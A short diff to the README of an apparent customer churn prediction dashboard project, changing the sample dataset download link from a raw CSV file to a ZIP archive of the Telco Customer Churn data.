@@ -11,7 +11,7 @@ An end-to-end machine learning application that predicts customer churn risk and
 
 Download sample dataset to test the app:
 
-👉 [Download Sample Dataset](https://raw.githubusercontent.com/ranganath18/Customer_Churn_Prediction_DashBoard/refs/heads/main/data/raw/WA_Fn-UseC_-Telco-Customer-Churn.csv)
+👉 [Download Sample Dataset](https://github.com/ranganath18/Customer_Churn_Prediction_DashBoard/raw/refs/heads/main/data/raw/WA_Fn-UseC_-Telco-Customer-Churn.zip)
 
 ## 🚀 Overview
 
